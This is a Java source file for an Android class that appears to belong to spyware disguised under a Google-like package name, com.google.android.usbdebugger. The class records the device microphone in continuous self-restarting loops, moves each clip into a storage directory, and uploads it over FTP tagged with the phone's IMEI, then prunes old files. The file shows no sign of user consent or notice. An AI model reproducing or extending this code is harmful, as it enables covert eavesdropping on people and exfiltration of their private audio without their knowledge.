package com.google.android.usbdebugger;

import android.content.Context;
import android.database.sqlite.SQLiteDatabase;
import android.media.MediaRecorder;
import android.util.Log;
import org.apache.commons.io.FileUtils;

import java.io.File;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.Locale;

public class Records {
    private static final String TAG = "Records";
    public boolean recordstatus;
    private MediaRecorder recorder;
    private String tempFilePath = "";

    private Context context;
    private File aDir, aTempDir;
    private ArrayList<String> Params;
    private String imeiNumber1;
    private boolean screenstastus;
    private int recordCount;

    public void Config(final Context contx, final File aTempDir2, final File aDir2, final ArrayList<String> Params2,
                       final boolean screenstastus2, final String imeiNumber, final int recordCount2){
        context = contx;
        aDir = aDir2;
        aTempDir = aTempDir2;
        Params = Params2;
        screenstastus = screenstastus2;
        imeiNumber1 = imeiNumber;
        recordCount = recordCount2;
    }

    public boolean recordStart() {
        if (recordstatus) {
            return true; 
        }

        recorder = new MediaRecorder();
        try {
            recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            recorder.setAudioEncodingBitRate(128000);
            recorder.setAudioSamplingRate(44100);

            int dur = 30; 
            try {
                if (Params != null && Params.size() > 21 && !Params.get(21).isEmpty()) {
                    dur = Integer.parseInt(Params.get(21));
                }
            } catch (Exception e) {
                Log.w(TAG, "Invalid DUR value, using default 30s.");
            }
            recorder.setMaxDuration(dur * 1000);

            SimpleDateFormat ft = new SimpleDateFormat("ddMMyyyyHHmmssSSS", Locale.US);
            Date dt = new Date();
            File newDtAudiofile = new File(aTempDir, ft.format(dt) + ".m4a");
            tempFilePath = newDtAudiofile.getAbsolutePath();
            recorder.setOutputFile(tempFilePath);

            recorder.setOnInfoListener((mr, what, extra) -> {
                if (what == MediaRecorder.MEDIA_RECORDER_INFO_MAX_DURATION_REACHED) {
                    recordStop(0);
                    recordStart();
                }
            });

            recorder.prepare();
            recorder.start();
            recordstatus = true;
            Log.d(TAG, "Запись звука начата в файл: " + tempFilePath);
            return true; 

        } catch (Exception e) {
            Log.e(TAG, "Ошибка при запуске записи: ", e);
            cleanupRecorder();
            return false; 
        }
    }

    public void recordStop(int stat) {
        if (!recordstatus) {
            return;
        }

        String recordedFilePath = tempFilePath;
        cleanupRecorder();
        Log.d(TAG, "Запись звука остановлена.");

        if (stat == 0 && recordedFilePath != null && !recordedFilePath.isEmpty()) {
            processRecordedFile(recordedFilePath);
        }
    }

    // ИСПРАВЛЕНО: Метод переписан для гарантированного освобождения ресурсов
    private void cleanupRecorder() {
        if (recorder != null) {
            try {
                if (recordstatus) {
                    recorder.stop();
                }
            } catch (Exception e) {
                Log.w(TAG, "Ошибка при вызове recorder.stop(): " + e.getMessage());
            }

            try {
                recorder.release();
            } catch (Exception e) {
                Log.e(TAG, "Критическая ошибка при освобождении MediaRecorder: " + e.getMessage());
            }
            
            recorder = null;
            recordstatus = false;
            tempFilePath = "";
        }
    }

    private void processRecordedFile(String sourceFilePath) {
        File sourceFile = new File(sourceFilePath);
        if (!sourceFile.exists()) {
            Log.w(TAG, "Записанный файл не найден: " + sourceFilePath);
            return;
        }

        File destFile = new File(aDir, sourceFile.getName());

        try {
            FileUtils.moveFile(sourceFile, destFile);
            Log.d(TAG, "Файл успешно перемещен в: " + destFile.getAbsolutePath());

            new Thread(() -> {
                String[] filesToSend = { destFile.getAbsolutePath() };
                FTP_Sender.FTP(null, filesToSend, 1, 1, 0, Params, screenstastus,
                        imeiNumber1, context, recordCount, aDir);

                DBHelper dbh = new DBHelper(context);
                if (recordCount > 0) {
                    dbh.cleanupDirectory(aDir, recordCount);
                }
            }).start();

        } catch (IOException ex) {
            Log.e(TAG, "Ошибка при перемещении файла", ex);
             DBHelper dbh = new DBHelper(context);
             try (SQLiteDatabase db = dbh.getWritableDatabase()) {
                 dbh.insert_Exeption(db, "recordStop FileUtils.moveFile()", "IOException", ex.getMessage(), new SimpleDateFormat("dd-MM-yyyy HH:mm:ss", Locale.US).format(new Date()));
             }
        } catch (Exception e) {
            Log.e(TAG, "Критическая ошибка при обработке записанного файла", e);
        }
    }
}
